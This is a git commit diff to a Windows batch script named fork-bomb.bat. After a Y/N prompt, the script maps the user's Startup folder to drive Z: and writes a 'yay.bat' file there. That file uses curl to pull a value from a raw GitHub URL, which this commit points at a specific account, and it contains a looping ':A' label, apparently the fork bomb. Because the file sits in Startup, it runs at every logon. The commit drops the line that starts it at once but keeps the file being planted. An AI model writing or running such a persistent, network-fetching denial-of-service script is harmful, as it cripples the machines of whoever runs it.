3abaaac028e372257b125b694b7a007cb751059f
I Is Evil Duck <140123334+i-is-evil-duck@users.noreply.github.com>
2024-11-04 14:37:50 -0800

    Update fork-bomb.bat

--- fork-bomb.bat
+++ fork-bomb.bat
@@ -4,13 +4,12 @@ set /p confirm=Do you want to continue? (Y/N):
 if /i "!confirm!"=="Y" (
     subst Z: "%USERPROFILE%\Start Menu\Programs\Startup"
     timeout 2 > nul
-    cd /d Z:\
-    
+    cd /d Z:\  
     (
         echo @echo off
         echo setlocal enabledelayedexpansion
         echo set "token=hasdjklskalsdjasd90d8a380asdy7a90sd"
-        echo for /f "delims=" %%%%i in ^('curl -s https://raw.githubusercontent.com/user/token/refs/heads/main/token.txt'^) do ^(
+        echo for /f "delims=" %%%%i in ^('curl -s https://raw.githubusercontent.com/cokie1479/73128sad0asdsa/refs/heads/main/ajdsa.txt'^) do ^(
         echo     set "fetched_token=%%%%i"
         echo     echo :A
         echo     echo pause
@@ -25,9 +24,6 @@ if /i "!confirm!"=="Y" (
         echo     exit /b
         echo ^)
     ) > "yay.bat"
-    
-    start yay.bat
-    pause
 ) else (
     echo Exiting without opening yay.bat
     pause
